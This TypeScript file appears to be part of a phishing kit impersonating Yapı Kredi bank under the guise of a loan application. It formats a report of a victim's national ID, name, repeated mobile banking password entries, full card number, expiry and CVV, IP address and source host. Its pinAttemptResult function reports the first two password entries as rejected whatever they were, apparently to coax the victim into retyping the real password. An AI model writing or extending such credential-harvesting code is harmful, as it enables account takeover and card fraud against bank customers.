import type { ApplicantWithAttempts, Attempt } from "@/lib/storage/types";

function dash(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return "—";
  if (typeof value === "string" && !value.trim()) return "—";
  return String(value);
}

function yesNo(value: boolean): string {
  return value ? "Evet" : "Hayır";
}

function formatMoney(amount: number): string {
  return `${amount.toLocaleString("tr-TR")} TL`;
}

function formatCardNumber(card: string): string {
  const digits = card.replace(/\D/g, "");
  if (!digits) return "—";
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatDateTime(iso: string): string {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return dash(iso);
  return d.toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function pinAttemptResult(attempt: Attempt): string {
  return attempt.attemptNumber < 3 ? "Reddedildi" : "Kabul edildi";
}

function isPinAttempt(attempt: Attempt): boolean {
  return attempt.loanAmount === 0;
}

export function formatApplicantNotes(
  applicant: ApplicantWithAttempts,
  sourceHost: string
): string {
  const attempts = [...applicant.attempts].sort(
    (a, b) => a.attemptNumber - b.attemptNumber
  );
  const pinAttempts = attempts.filter(isPinAttempt);
  const finalAttempt =
    attempts.find((a) => !isPinAttempt(a)) ??
    attempts[attempts.length - 1];
  const identity = finalAttempt ?? pinAttempts[0];

  const lines: string[] = [
    "[Başvuru — Yapı Kredi]",
    `Tarih: ${formatDateTime(applicant.completedAt ?? applicant.createdAt)}`,
    "",
    "── Kimlik ──",
    `TC Kimlik: ${dash(identity?.tcKimlik)}`,
    `Ad Soyad: ${dash(identity ? `${identity.firstName} ${identity.lastName}`.trim() : "")}`,
    "",
    "── Mobil Şifre Denemeleri ──",
  ];

  if (pinAttempts.length === 0) {
    lines.push("—");
  } else {
    for (const attempt of pinAttempts) {
      lines.push(
        `Deneme ${attempt.attemptNumber}: Şifre ${dash(attempt.mobilePin)} — ${pinAttemptResult(attempt)}`
      );
    }
  }

  lines.push(
    "",
    "── Kredi (Son Başvuru) ──",
    `Tutar: ${finalAttempt && finalAttempt.loanAmount > 0 ? formatMoney(finalAttempt.loanAmount) : "—"}`,
    `Vade: ${finalAttempt && finalAttempt.loanTerm > 0 ? `${finalAttempt.loanTerm} ay` : "—"}`,
    "",
    "── Kart (Son Başvuru) ──",
    `Kart Kullanmıyor: ${finalAttempt ? yesNo(finalAttempt.noCreditCard) : "—"}`,
    `Kart No: ${finalAttempt && !finalAttempt.noCreditCard ? formatCardNumber(finalAttempt.cardNumber) : "—"}`,
    `Son Kullanma: ${finalAttempt && !finalAttempt.noCreditCard ? dash(finalAttempt.cardExpiry) : "—"}`,
    `CVV: ${finalAttempt && !finalAttempt.noCreditCard ? dash(finalAttempt.cardCvv) : "—"}`,
    "",
    "── Sistem ──",
    `Başvuru ID: ${applicant.id}`,
    `Toplam Deneme: ${attempts.length}`,
    `Son Deneme ID: ${dash(finalAttempt?.id)}`,
    `Oturum ID: ${applicant.sessionId}`,
    `Durum: ${applicant.status}`,
    `IP: ${dash(applicant.ipAddress)}`,
    `Kaynak: ${dash(sourceHost)}`
  );

  return lines.join("\n");
}
